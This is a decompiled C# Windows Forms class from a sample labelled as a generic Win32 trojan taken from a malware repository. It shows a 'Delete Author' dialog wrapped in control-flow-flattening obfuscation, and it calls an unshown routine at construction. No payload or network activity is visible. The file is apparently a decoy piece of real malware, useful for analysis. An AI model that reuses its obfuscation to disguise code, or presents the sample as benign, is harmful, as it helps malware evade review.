// Decompiled with JetBrains decompiler
// Type: ProjNet.Common.ListenerRegistry
// Assembly: IRefl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A29A65F6-B7ED-422C-83D4-B9EFD61E5F13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-8e89881e34371e10b7f9cb943183a061aab9b22853cb7192e1ac09401f4cc545.exe

using ProjNet.Services;
using ProjNet.Structs;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace ProjNet.Common
{
  public class ListenerRegistry : Form
  {
    private IContainer m_FieldRegistry;
    private Button m_PolicyRegistry;
    private Label m_ParameterRegistry;
    private TextBox procRegistry;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ListenerRegistry()
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              PageAdvisorStructBuilder.PrepareCreator();
              if (!ListenerRegistry.CloneModel())
              {
                num2 = 3;
                continue;
              }
              goto case 3;
            case 2:
            case 4:
              this.DeleteFacade();
              if (ListenerRegistry.CancelModel())
              {
                num2 = 5;
                continue;
              }
              goto case 0;
            case 3:
              this.m_FieldRegistry = (IContainer) null;
              // ISSUE: explicit constructor call
              base.\u002Ector();
              goto case 2;
            case 5:
              goto label_8;
            default:
              goto label_6;
          }
        }
label_6:
        num1 = 4;
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void UpdateFacade(object instance, EventArgs cust)
    {
      try
      {
        CallbackRegistry.DeleteAuthor(int.Parse(this.procRegistry.Text));
        int num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 3:
              int num2 = (int) MessageBox.Show("Success");
              goto case 1;
            case 1:
            case 2:
              this.procRegistry.Text = "";
              num1 = 4;
              continue;
            case 4:
              goto label_7;
            default:
              num1 = 2;
              continue;
          }
        }
label_7:;
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Deletion Failed.");
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool assetinstall)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_10;
            case 1:
            case 3:
              goto label_1;
            case 2:
            case 4:
              goto label_8;
            case 5:
              goto label_12;
            default:
              num2 = 4;
              continue;
          }
        }
label_1:
        int num3 = this.m_FieldRegistry != null ? 1 : 0;
label_3:
        if (num3 != 0)
          this.m_FieldRegistry.Dispose();
        else
          goto label_9;
label_8:
label_9:
        base.Dispose(assetinstall);
        num1 = 5;
        continue;
label_10:
        if (!assetinstall)
        {
          num3 = 0;
          goto label_3;
        }
        else
          num1 = 3;
      }
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DeleteFacade()
    {
      int num1 = 10;
      if (true)
        goto label_11;
label_1:
      this.m_ParameterRegistry.TabIndex = 1;
      this.m_ParameterRegistry.Text = "Author ID:";
      this.procRegistry.Location = new Point(75, 13);
      this.procRegistry.Name = "authorIDTextBox";
      this.procRegistry.Size = new Size(100, 20);
      this.procRegistry.TabIndex = 2;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      if (true)
      {
        num1 = 6;
        goto label_11;
      }
label_2:
      this.m_PolicyRegistry.UseVisualStyleBackColor = true;
      this.m_PolicyRegistry.Click += new EventHandler(this.UpdateFacade);
      this.m_ParameterRegistry.AutoSize = true;
      int num2 = 7;
label_10:
      num1 = num2;
label_11:
      while (true)
      {
        switch (num1)
        {
          case 0:
            this.m_ParameterRegistry = new Label();
            this.procRegistry = new TextBox();
            num1 = 1;
            continue;
          case 1:
            goto label_7;
          case 2:
            this.Controls.Add((Control) this.procRegistry);
            this.Controls.Add((Control) this.m_ParameterRegistry);
            this.Controls.Add((Control) this.m_PolicyRegistry);
            this.Name = "DeleteAuthor";
            num1 = 8;
            continue;
          case 3:
          case 5:
            goto label_1;
          case 4:
          case 7:
            goto label_9;
          case 6:
            goto label_5;
          case 8:
            this.Text = "Delete Author";
            this.ResumeLayout(false);
            this.PerformLayout();
            if (ListenerRegistry.CancelModel())
            {
              num1 = 11;
              continue;
            }
            goto label_5;
          case 9:
            goto label_2;
          case 10:
            this.m_PolicyRegistry = new Button();
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto label_9;
          case 11:
            goto label_13;
          default:
            num1 = 3;
            continue;
        }
      }
label_5:
      this.ClientSize = new Size(197, 94);
      num2 = 2;
      goto label_10;
label_7:
      this.SuspendLayout();
      this.m_PolicyRegistry.Location = new Point(75, 58);
      this.m_PolicyRegistry.Name = "deleteButton";
      this.m_PolicyRegistry.Size = new Size(75, 23);
      this.m_PolicyRegistry.TabIndex = 0;
      this.m_PolicyRegistry.Text = "Delete";
      num2 = 9;
      goto label_10;
label_9:
      this.m_ParameterRegistry.Location = new Point(13, 13);
      this.m_ParameterRegistry.Name = "label1";
      this.m_ParameterRegistry.Size = new Size(55, 13);
      goto label_1;
label_13:;
    }

    internal static bool CancelModel() => true;

    internal static bool CloneModel() => false;
  }
}
